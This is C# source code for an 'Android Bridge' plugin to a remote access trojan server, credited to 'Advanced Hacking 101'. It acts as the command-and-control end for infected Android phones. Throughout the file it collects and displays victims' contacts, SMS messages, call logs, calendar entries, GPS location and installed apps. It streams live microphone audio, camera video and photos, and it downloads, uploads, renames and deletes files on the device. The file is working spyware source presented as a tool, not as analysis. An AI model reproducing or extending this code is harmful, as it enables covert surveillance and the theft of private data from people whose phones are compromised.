using System;
using System.Collections.Generic;
using System.Text;
using sCore;
using sCore.Intergration;
using sCore.RAT;
using sCore.IO;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using System.IO;

namespace AndroidExtension
{
    #region Application Classes

    /// <summary>
    /// Main Plugin Class
    /// </summary>
    public class Class1 : IPluginMain
    {
        #region Variables

        //Define the plugin variables

        public string ScriptName { get; set; } = "Android Bridge";
        public Version Scriptversion { get; set; } = new Version(1, 0);
        public string AuthorName { get; set; } = "Advanced Hacking 101";
        public string ScriptDescription { get; set; } = "Provides integration with android R.A.T Clients";
        public Permissions[] ScriptPermissions { get; set; } = { Permissions.Display };

        //Define class events

        /// <summary>
        /// Contact Listing event
        /// </summary>
        public event Action<Dictionary<String, String>> ContactsListReveived;
        /// <summary>
        /// Call log listing event
        /// </summary>
        public event Action<List<CallData>> CallLogReceived;
        /// <summary>
        /// Sms Message listing event
        /// </summary>
        public event Action<List<SmsData>> SmsDataReceived;
        /// <summary>
        /// Calendar event listing event
        /// </summary>
        public event Action<List<EventData>> CalendarDataReceived;
        /// <summary>
        /// File listing event
        /// </summary>
        public event Action<List<FileData>> FilesReceived;
        /// <summary>
        /// File operation feedback event
        /// </summary>
        public event Action<FileOperation> FileOperationResult;
        /// <summary>
        /// Client Joined the server event
        /// </summary>
        public event Action<string> ClientJoined;
        /// <summary>
        /// Client disconnected event
        /// </summary>
        public event Action<string> ClientDisconnected;
        /// <summary>
        /// Photo displaying event
        /// </summary>
        public event Action<byte[]> PhotoReceived;
        /// <summary>
        /// Video frame received event
        /// </summary>
        public event Action<byte[]> VideoReceived;

        //Define the program variables

        /// <summary>
        /// The main server socket
        /// </summary>
        private Socket serverSocket;
        /// <summary>
        /// The connected clients list
        /// </summary>
        private List<Socket> clientList = new List<Socket>();
        /// <summary>
        /// The current, controlled client
        /// </summary>
        public Socket currentClient;
        /// <summary>
        /// The Main R.A.T Form1 Control to invoke UI actions
        /// </summary>
        private Control invoker;
        /// <summary>
        /// The android control panel form
        /// </summary>
        private AndroidUI ui;
        /// <summary>
        /// Indicates if the server should recive audio data
        /// </summary>
        private bool expectAudio = false;
        /// <summary>
        /// Audio data playback object
        /// </summary>
        private AudioStream audioPlayback;
        /// <summary>
        /// Indicates if the server should expect photo data
        /// </summary>
        public bool expectPhoto = false;
        /// <summary>
        /// Indicates if the server shold expect video frames
        /// </summary>
        public bool expectVideo = false;
        /// <summary>
        /// The servers receive buffer size
        /// </summary>
        private int recvBufferSize = 20971520;
        /// <summary>
        /// File download total file length
        /// </summary>
        private int dlTotalLength;
        /// <summary>
        /// File download completed length
        /// </summary>
        private int dlCurrentLength;
        /// <summary>
        /// Indicates if the server should expect file data
        /// </summary>
        private bool isDlFile = false;
        /// <summary>
        /// The path to download the file to
        /// </summary>
        public string dlFilePath = "";
        /// <summary>
        /// The path of the file to upload
        /// </summary>
        public string ulFilePath = "";

#endregion

        #region Structs

        /// <summary>
        /// Provides info about the result of a file opreation
        /// </summary>
        public struct FileOperation
        {
            public string name;
            public string message;
            public bool success;
        }

        /// <summary>
        /// Provides info about files
        /// </summary>
        public struct FileData
        {
            public string name;
            public int size;
            public string path;
            public bool isDir;
        }

        /// <summary>
        /// Provides info about calendar events
        /// </summary>
        public struct EventData
        {
            public string name;
            public string description;
            public string location;
            public string id;
            public string startTime;
            public string endTime;
        }

        /// <summary>
        /// Provides info about sms messages
        /// </summary>
        public struct SmsData
        {
            public string id;
            public int threadID;
            public string phoneNumber;
            public string message;
            public string date;
            public string seen;
            public bool sent;
        }

        /// <summary>
        /// Provides info about call log
        /// </summary>
        public struct CallData
        {
            public string phoneNumber;
            public int callDuration;
            public String callDate;
            public string callType;
        }

        /// <summary>
        /// The async read state object structure
        /// </summary>

        private struct MessageData
        {
            public Socket sender;
            public byte[] bytes;
            public byte[] dataStore;
            public int dataStoreCount;
            public int fullMsgLength;
            public Object tempDataSave;
        }

        #endregion

        #region Plugin Functions
        /// <summary>
        /// The plugin entry point
        /// </summary>

        public void Main()
        {
            Integrate.SetPlugin(this); //Integrate the plugin
            Integrate.StartPluginThread(new MainFunction(PluginMain)); //Create a new theread
            invoker = sCore.UI.CommonControls.mainTabControl.Parent; //Get the R.A.T Server Form
        }

        /// <summary>
        /// Plugin Thread
        /// </summary>

        public void PluginMain()
        {
            //Get the application port for the server
            int appPort = default(int);
            Types.InputBoxValue result = ServerSettings.ShowInputBox("Android Bridge", "Please enter a port for the android listener to run on");
            if (result.dialogResult != DialogResult.OK) return;
            ui = new AndroidUI(this);
            Invoke(() => ui.Show());
            appPort = int.Parse(result.result);
            serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); //Create the socket server
            serverSocket.Bind(new IPEndPoint(IPAddress.Any, appPort)); //Bind the server to any interface and the selected port number
            serverSocket.Listen(5); //begin listen max. 5 pending connections
            serverSocket.BeginAccept(new AsyncCallback(AcceptCallback), null); //begin accepting clients
        }

        /// <summary>
        /// Invoke an action on the R.A.T Form
        /// </summary>
        /// <param name="action">The action to invoke</param>

        private void Invoke(Action action)
        {
            if (invoker.InvokeRequired) //If we nedd to invoke then
            {
                invoker.Invoke(action); //Invoke action on the UI thread
            }
            else action.Invoke(); //Invoke action on the current thread
        }

        /// <summary>
        /// Accepting the incoming connections and stroing them
        /// </summary>
        /// <param name="ar">The async result</param>

        private void AcceptCallback(IAsyncResult ar)
        {
            try
            {
                Socket newClient = serverSocket.EndAccept(ar); //The connected client
                MessageData md = new MessageData() //Define the ar state object
                {
                    bytes = new byte[recvBufferSize],
                    sender = newClient
                };

                string friendlyName = "Client" + clientList.Count.ToString(); //Client name

                Invoke(() => ClientJoined?.Invoke(friendlyName)); //Call the client joined event

                clientList.Add(newClient); //Add to the client list

                newClient.BeginReceive(md.bytes, 0, recvBufferSize, SocketFlags.None, new AsyncCallback(ReadCallback), md); //begin reading from the stream

                Console.WriteLine("New client connected");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to accept client\r\nError: " + ex.Message);
            }

            serverSocket.BeginAccept(new AsyncCallback(AcceptCallback), null); //Restart accepting clients
        }

        /// <summary>
        /// Read messages from clients
        /// </summary>
        /// <param name="ar">The async result</param>

        private void ReadCallback(IAsyncResult ar)
        {
            int readBytes = default(int); //bytes read from the stream
            MessageData md = (MessageData)ar.AsyncState; //The message data assigned
            bool dclient = false; //If dclient client disconnect is signalled
            bool dlFinished = false; //If file download is finished

            try
            {
                readBytes = md.sender.EndReceive(ar); //Read bytes from the stream
            }
            catch (Exception ex)
            {
                Console.WriteLine("Read error\r\nError: " + ex.Message);
            }

            if (readBytes > 0) //if bytes read are more than 0
            {
                //Get the message bytes
                byte[] recv = new byte[readBytes];
                Array.Copy(md.bytes, recv, readBytes);
                Array.Clear(md.bytes, 0, recvBufferSize);

                if (isDlFile) //If downloading file
                {
                    if (File.Exists(dlFilePath)) //If file created
                    {
                        using (FileStream fs = new FileStream(dlFilePath, FileMode.Append, FileAccess.Write)) //Oepn the file for writing and append
                        {
                            fs.Write(recv, 0, readBytes); //Write file bytes
                            dlCurrentLength += readBytes; //Increment the bytes written count
                        }
                    }
                    else //File not created yet
                    {
                        using (FileStream fs = File.Create(dlFilePath)) //Create file and open for writing
                        {
                            fs.Write(recv, 0, readBytes); //Write file bytes
                            dlCurrentLength += readBytes; //Increment the bytes written count
                        }
                    }

                    if (dlTotalLength == dlCurrentLength) //if bytes written = fileSize
                    {
                        isDlFile = false; //No longer downloading file
                        dlFinished = true; //Download is finished (blocking normal command interpretation for one more loop)
                        //Signal a new FileOperation, notify the user that the file is ready
                        FileOperation fop = new FileOperation()
                        {
                            name = "File Download",
                            success = true,
                            message = "File downloaded to the selected path"
                        };

                        Invoke(() => FileOperationResult?.Invoke(fop));
                    }
                }

                if (!isDlFile && !dlFinished) //if not downloading and download is not finishing
                {
                    string message = Encoding.UTF8.GetString(recv, 0, readBytes); //Convert message to text
                    int msgLength = GetDataLength(message); //Get the length header data
                    bool restartReading = false; //Indicates if the function should restart reading and skip command interpretation

                    if (((msgLength > readBytes && msgLength != 0) || (md.fullMsgLength > readBytes)) && !expectAudio) //Protocol messes up audio streaming :(
                    {
                        md.dataStoreCount += readBytes; //Increment the stored bytes count
                        if (md.dataStoreCount == readBytes) //If this is the first store of data
                        {
                            md.fullMsgLength = msgLength + 9; // +9 to count the lengthHeader too
                            md.dataStore = new byte[readBytes]; //init the buffer to store data
                            Array.Copy(recv, md.dataStore, readBytes); //Copy the received bytes to the store
                            Console.WriteLine("First Data Store: " + readBytes + " bytes");
                        }
                        else //Not first stroing
                        {
                            //Save the data store in a temp buffer
                            byte[] tempbytes = new byte[md.dataStoreCount - readBytes];
                            Array.Copy(md.dataStore, tempbytes, md.dataStoreCount - readBytes);
                            //Allocate new dataStore
                            md.dataStore = new byte[md.dataStoreCount];
                            //Restore previous data
                            Array.Copy(tempbytes, md.dataStore, tempbytes.Length);
                            //Copy new data received
                            Array.ConstrainedCopy(recv, 0, md.dataStore, tempbytes.Length, readBytes);
                            Console.WriteLine("Second Data Store, fullbytes: " + md.dataStoreCount);
                            Console.WriteLine("Full message length: " + md.fullMsgLength);
                        }

                        if (md.fullMsgLength == md.dataStoreCount) //Optimal case, data received
                        {
                            Console.WriteLine("Count equals, decoding message");
                            message = Encoding.UTF8.GetString(md.dataStore, 0, md.dataStoreCount); //Decode the full message
                            recv = new byte[md.dataStoreCount - 9]; //Allocate new recv
                            Array.ConstrainedCopy(md.dataStore, 9, recv, 0, md.dataStoreCount - 9); //Skip the length header bytes
                            Array.Clear(md.dataStore, 0, md.dataStoreCount); //Clear the dataStore
                            //Reset data store
                            md.dataStoreCount = 0;
                            md.fullMsgLength = 0;
                        }
                        else //Count mismatch, can't interpret command
                        {
                            restartReading = true;
                            Console.WriteLine("Count mismatch, " + md.dataStoreCount + "/" + md.fullMsgLength);
                        }

                        if (md.dataStoreCount > md.fullMsgLength) //Too fast streaming, other packets stored than original
                        {
                            //Discard previous data
                            md.dataStoreCount = 0;
                            md.fullMsgLength = 0;
                            Array.Clear(md.dataStore, 0, md.dataStore.Length);

                            restartReading = true; //ignore current chunk of data
                        }
                    }
                    else //If no need for the protocol, then cut the length header from the byte array
                    {
                        byte[] temp = new byte[readBytes];
                        Array.Copy(recv, temp, readBytes);
                        recv = new byte[readBytes - 9];
                        Array.ConstrainedCopy(temp, 9, recv, 0, readBytes - 9);
                        Array.Clear(temp, 0, readBytes);
                    }

                    if (!restartReading) //if allowed to handle commands
                    {
                        if (!expectAudio && !expectPhoto && !expectVideo) //if not expecting any raw bytes then handle command
                        {
                            message = message.Substring(9); //Remove the length header
                            message = Encoding.UTF8.GetString(Convert.FromBase64String(message));
                            Console.WriteLine("Message Received: " + message);

                            if (message == "dclient") //Client going to die
                            {
                                //Dispose the client and signal the UI
                                dclient = true;
                                string clientName = "Client" + clientList.IndexOf(md.sender);
                                Invoke(() => ClientDisconnected?.Invoke(clientName));
                                clientList.Remove(md.sender);
                                if (md.sender == currentClient) currentClient = null;
                                md.sender.Shutdown(SocketShutdown.Both);
                                if (md.sender.Connected) md.sender.Disconnect(false);
                                md.sender.Close();
                                md.sender.Dispose();
                                md.sender = null;
                            }

                            if (message == "test") //Test connection response
                            {
                                ShowMessageBox("Connection is working!", "Connection test", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            }

                            if (message.StartsWith("gps|")) //Gps data recevice gps|latitude|longitude
                            {
                                string lat = message.Split('|')[1];
                                if (lat != "failed")
                                {
                                    string lng = message.Split('|')[2];
                                    ShowMessageBox("Latitude: " + lat + Environment.NewLine + "Longitude: " + lng, "Location Data", MessageBoxButtons.OK, MessageBoxIcon.Information);
                                }
                                else
                                {
                                    ShowMessageBox("Failed to get device location!", "Location Data", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                }
                            }

                            if (message.StartsWith("battery|")) //Battery data received battery|level|is charging|charge method|temperature
                            {
                                string[] data = message.Split('|');
                                string level = data[1].Substring(0, data[1].IndexOf('.'));
                                string charging = data[2];
                                string method = data[3];
                                string temp = data[4];

                                string displayData = "Battery Level: " + level + "%\r\n" + "Battery Charging: " + charging + "\r\n" + "Battery Charging Method: " +
                                    method + "\r\nBattery Temperature: " + temp + "°C";

                                ShowMessageBox(displayData, "Battery Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            }

                            if (message.StartsWith("contactData")) //Get all contacts
                            {
                                //Serialize data and signal the UI
                                string data = message.Substring(11);
                                String[] contacts = data.Split('|');
                                Dictionary<string, string> contactsList = new Dictionary<string, string>();

                                foreach (string contact in contacts)
                                {
                                    String[] contactData = contact.Split(';');
                                    string contactID = contactData[0];
                                    string contactName = contactData[1];
                                    contactsList.Add(contactID, contactName);
                                }

                                Invoke(() => ContactsListReveived?.Invoke(contactsList));
                            }

                            if (message.StartsWith("contact|")) //Get contact data
                            {
                                //Serialize the data and display it msgBoxes
                                string[] data = message.Substring(8).Split('|');
                                string phoneNumbers = data[0];
                                string emailAddresses = data[1];
                                string address = data[2];
                                string note = data[3];

                                ShowMessageBox("Associated Phone Number(s): \r\n" + phoneNumbers.Replace(";", Environment.NewLine), "Contact Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                                ShowMessageBox("Associated Email Address(es): \r\n" + emailAddresses.Replace(";", Environment.NewLine), "Contact Informaton", MessageBoxButtons.OK, MessageBoxIcon.Information);
                                ShowMessageBox("Associated Address: \r\n" + address, "Contact Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                                ShowMessageBox("Associated Note: \r\n" + note, "Contact Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            }

                            if (message.StartsWith("calldata|")) //Get the call log
                            {
                                //Serialize the data and signal the UI
                                string data = message.Substring(9);
                                if (data == "failed")
                                {
                                    ShowMessageBox("Failed to get call log", "Call Log", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                }
                                else
                                {
                                    data = data.Replace("plus", "+");
                                    List<CallData> callDataList = new List<CallData>();
                                    String[] logs = data.Split('|');

                                    foreach (String log in logs)
                                    {
                                        String[] logData = log.Split(';');
                                        CallData cd = new CallData()
                                        {
                                            phoneNumber = logData[0],
                                            callDuration = int.Parse(logData[1]),
                                            callDate = logData[2],
                                            callType = logData[3]
                                        };

                                        callDataList.Add(cd);
                                    }

                                    Invoke(() => CallLogReceived?.Invoke(callDataList));
                                }
                            }

                            if (message.StartsWith("sms-msg|")) //Get SMS Messages
                            {
                                //Serialize data and signal the UI
                                List<SmsData> smsMessages = new List<SmsData>();
                                string data = message.Substring(8);
                                string[] messages = data.Split('|');

                                foreach (string msg in messages)
                                {
                                    string[] messageData = msg.Split(';');
                                    SmsData sd = new SmsData()
                                    {
                                        id = messageData[0],
                                        phoneNumber = messageData[1],
                                        threadID = int.Parse(messageData[2]),
                                        date = messageData[3],
                                        message = messageData[4],
                                        seen = messageData[5],
                                        sent = (messageData[6] == "false") ? false : true
                                    };

                                    smsMessages.Add(sd);
                                }

                                Invoke(() => SmsDataReceived?.Invoke(smsMessages));

                                //md.tempDataSave = null;
                            }

                            if (message.StartsWith("calendar|")) //Get calendar events
                            {
                                //Serialize data and Signal the UI
                                string data = message.Substring(9);
                                if (data != "failed")
                                {
                                    String[] events = data.Split('|');
                                    List<EventData> dataList = new List<EventData>();

                                    foreach (String cevent in events)
                                    {
                                        String[] eventData = cevent.Split(';');
                                        EventData ed = new EventData()
                                        {
                                            name = eventData[0],
                                            description = eventData[1],
                                            location = eventData[2],
                                            id = eventData[3],
                                            startTime = eventData[4],
                                            endTime = eventData[5]
                                        };

                                        dataList.Add(ed);
                                    }

                                    Invoke(() => CalendarDataReceived?.Invoke(dataList)); 
                                }
                            }

                            if (message.StartsWith("apps|")) //List installed apps
                            {
                                //Serialize data and Signal the UI
                                string data = message.Substring(5);
                                StringBuilder sb = new StringBuilder();
                                
                                foreach (string app in data.Split('|'))
                                {
                                    sb.Append(app).Append(", ");
                                }

                                ShowMessageBox(sb.ToString(), "Installed Apps", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            }

                            if (message.StartsWith("flist|")) //List Files
                            {
                                //Serialize data and Signal the UI
                                string data = message.Substring(6);
                                if (data == "failed")
                                {
                                    FileOperation fop = new FileOperation()
                                    {
                                        name = "List Files",
                                        success = false,
                                        message = "Failed to list files in the selected directory"
                                    };

                                    Invoke(() => FileOperationResult?.Invoke(fop));

                                }
                                else
                                {
                                    String[] files = data.Split('|');
                                    List<FileData> fileList = new List<FileData>();

                                    foreach (String file in files)
                                    {
                                        string[] fileData = file.Split(';');
                                        FileData fd = new FileData()
                                        {
                                            name = fileData[0],
                                            size = int.Parse(fileData[1]),
                                            path = fileData[2],
                                            isDir = (fileData[3] == "y") ? true : false
                                        };

                                        fileList.Add(fd);
                                    }

                                    Invoke(() => FilesReceived?.Invoke(fileList));
                                }
                            }

                            if (message.StartsWith("fpaste|")) //Patse file result
                            {
                                //Create FileOperation and Signal the UI
                                string data = message.Substring(7);
                                FileOperation fop = new FileOperation()
                                {
                                    name = "Paste file",
                                    success = (data == "ok") ? true : false,
                                    message = (data == "ok") ? "File Pasted to current directory" : "Failed to paste file to current directory"
                                };

                                Invoke(() => FileOperationResult?.Invoke(fop));
                            }

                            if (message.StartsWith("frename|")) //File Rename Result
                            {
                                //Create FileOperation result and Signal the UI
                                string data = message.Substring(8);
                                FileOperation fop = new FileOperation()
                                {
                                    name = "Rename file",
                                    success = (data == "ok") ? true : false,
                                    message = (data == "ok") ? "File Renamed" : "Failed to rename file"
                                };

                                Invoke(() => FileOperationResult?.Invoke(fop));
                            }

                            if (message.StartsWith("fdel|")) //Delete file result
                            {
                                //Create FileOperation result and Signal the UI
                                string data = message.Substring(5);
                                FileOperation fop = new FileOperation()
                                {
                                    name = "Delete file",
                                    success = (data == "ok") ? true : false,
                                    message = (data == "ok") ? "File Deleted" : "Failed to delete file"
                                };

                                Invoke(() => FileOperationResult?.Invoke(fop));
                            }

                            if (message.StartsWith("fconfirm|")) //Init download result
                            {
                                //Get result and start file download if result is positive
                                string data = message.Substring(9);
                                if (data == "failed")
                                {
                                    FileOperation fop = new FileOperation()
                                    {
                                        name = "File Download Init",
                                        success = false,
                                        message = "Failed to init file download, file doesn't exist"
                                    };

                                    Invoke(() => FileOperationResult?.Invoke(fop));
                                }
                                else
                                {
                                    isDlFile = true;
                                    dlTotalLength = int.Parse(data);
                                    dlCurrentLength = 0;
                                }
                            }

                            if (message.StartsWith("fupload|")) //File upload result
                            {
                                //Get result and handle it
                                string data = message.Substring(8);
                                if (data == "failed") //Failed to init on client side
                                {
                                    FileOperation fop = new FileOperation()
                                    {
                                        name = "File Upload",
                                        success = false,
                                        message = "Failed to start file upload, "
                                    };
                                    Invoke(() => FileOperationResult?.Invoke(fop));
                                }
                                else if (data == "ok") //client can receive the file
                                {
                                    byte[] fileBytes = File.ReadAllBytes(ulFilePath); //Get the file bytes
                                    SendBytes(fileBytes, fileBytes.Length); //Send the file bytes
                                }
                                else //Upload completed
                                {
                                    //Signal the UI
                                    FileOperation fop = new FileOperation()
                                    {
                                        name = "File Upload",
                                        success = true,
                                        message = "File upload completed, client confirmed file"
                                    };

                                    Invoke(() => FileOperationResult?.Invoke(fop));
                                }
                            }
                        }

                        if (expectVideo) //Expect video frames
                        {
                            //Pass the frame to the UI
                            Invoke(() => VideoReceived?.Invoke(recv));
                        }

                        if (expectPhoto) //Expect image data
                        {
                            //Pass image data to UI
                            Invoke(() => PhotoReceived?.Invoke(recv));
                            expectPhoto = false; //Expect photo no longer science it only sends 1 photo
                        }

                        if (expectAudio) //Expect audio data
                        {
                            audioPlayback.BufferPlay(recv); //Playback the audio
                            //Console.WriteLine("Bytes received: " + recv.Length);
                        }
                    }
                }
            }

            try { if (!dclient) md.sender.BeginReceive(md.bytes, 0, recvBufferSize, SocketFlags.None, new AsyncCallback(ReadCallback), md); } //Restart reading
            catch (Exception ex)
            {
                //Client disconnected without notifying
                Console.WriteLine("Android client closed!\r\nError: " + ex.Message);
                string clientName = "Client" + clientList.IndexOf(md.sender);
                Invoke(() => ClientDisconnected?.Invoke(clientName)); //Signal the UI
                clientList.Remove(md.sender); //Remove the client from the list
                if (md.sender == currentClient) currentClient = null; //If it was the selected client, unselect it
                md.sender.Close(); //Close the client
                md.sender.Dispose(); //Dispose the client
                md.sender = null; //Set the client to null
            }
        }

        /// <summary>
        /// Send raw bytes to the current connection
        /// </summary>
        /// <param name="data">The bytes to send</param>
        /// <param name="dataLength">The length of the bytes to send</param>

        private void SendBytes(byte[] data, int dataLength)
        {
            currentClient.Send(data, 0, dataLength, SocketFlags.None); //Send the raw bytes
        }

        /// <summary>
        /// Init the handling of the Audio Stream
        /// </summary>

        public void InitAudioStream()
        {
            //recvBufferSize = 1280;
            expectAudio = true; //Expect audio
            audioPlayback = new AudioStream(); //Create new audioPlayback object
            audioPlayback.Init(); //Init the playback
        }

        /// <summary>
        /// Stop the handling of the AudioStream
        /// </summary>

        public void DestroyAudioStream()
        {
            //recvBufferSize = 4096;
            expectAudio = false; //no longer expect audio
            audioPlayback.Destroy(); //Dispose the audioPlayback object
            audioPlayback = null; //Set it to null
        }

        /// <summary>
        /// Get the length header of the message
        /// </summary>
        /// <param name="message">The full message</param>
        /// <returns>The length header value</returns>

        private int GetDataLength(String message)
        {
            String lengthHeader = message.Substring(0, 9); //Get the header
            int.TryParse(lengthHeader, out int result); //Try parsing the header
            return result; //Return the header value
        }

        /// <summary>
        /// Create a messagebox on the UI Form
        /// </summary>
        /// <param name="text">The text of the messagebox</param>
        /// <param name="title">The title text of the messagebox</param>
        /// <param name="buttons">The displayed buttons of the messagebox</param>
        /// <param name="icon">The icon of the messagebox</param>

        private void ShowMessageBox(string text, string title, MessageBoxButtons buttons, MessageBoxIcon icon)
        {
            if (ui.InvokeRequired) //Invoke the messagebox on the UI thread
            {
                ui.Invoke(new Action(() => {
                    MessageBox.Show(text, title, buttons, icon);
                }));
            }
        }

        /// <summary>
        /// Send a command to a specified client
        /// </summary>
        /// <param name="command">The command to send</param>
        /// <param name="client">The socket of the client</param>

        private void SendCommand(string command, Socket client)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(command + "\r\n"); //Format for readLine
            client.Send(bytes, 0, bytes.Length, SocketFlags.None);
            Console.WriteLine("Command sent to client");
        }

        /// <summary>
        /// Send command to the currentClient
        /// </summary>
        /// <param name="command">The command to send</param>

        public void SendCommand(string command)
        {
            if (currentClient == null) return; //If currentClient not set, just return
            SendCommand(command, currentClient);
        }

        /// <summary>
        /// Set the current client
        /// </summary>
        /// <param name="clientIndex">The index of the socket in the clientList object</param>

        public void SetCurrentClient(int clientIndex)
        {
            currentClient = clientList[clientIndex];
        }

        /// <summary>
        /// Close all client sockets and the server
        /// </summary>

        private void CloseAll()
        {
            serverSocket.Shutdown(SocketShutdown.Both);
            serverSocket.Disconnect(false);
            serverSocket.Close();
            serverSocket.Dispose();
            serverSocket = null;
            clientList.Clear();
            clientList = null;
        }

        /// <summary>
        /// Plugin exit point
        /// </summary>

        public void OnExit()
        {
            CloseAll();
        }
#endregion
    }

    /// <summary>
    /// Handle Audio Data
    /// </summary>
    public class AudioStream
    {
        /// <summary>
        /// Audio data provider
        /// </summary>
        NAudio.Wave.BufferedWaveProvider provider;
        /// <summary>
        /// Audio data player
        /// </summary>
        NAudio.Wave.WaveOut waveOut;

        /// <summary>
        /// Init the audio playback
        /// </summary>
        public void Init()
        {
            NAudio.Wave.WaveFormat format = new NAudio.Wave.WaveFormat(44100, 16, 1);
            provider = new NAudio.Wave.BufferedWaveProvider(format);
            waveOut = new NAudio.Wave.WaveOut();
            waveOut.Init(provider);
            waveOut.Play();
        }

        /// <summary>
        /// Feed audio data into the speakers
        /// </summary>
        /// <param name="recv">The audio data bytes</param>
        public void BufferPlay(byte[] recv)
        {
            byte[] copied = new byte[recv.Length];
            Array.Copy(recv, copied, recv.Length);
            provider.AddSamples(copied, 0, copied.Length);
        }

        /// <summary>
        /// Dispose and destroy the audio playback object
        /// </summary>
        public void Destroy()
        {
            waveOut.Stop();
            provider.ClearBuffer();
            waveOut.Dispose();
            waveOut = null;
            provider = null;
        }
    }

#endregion
}
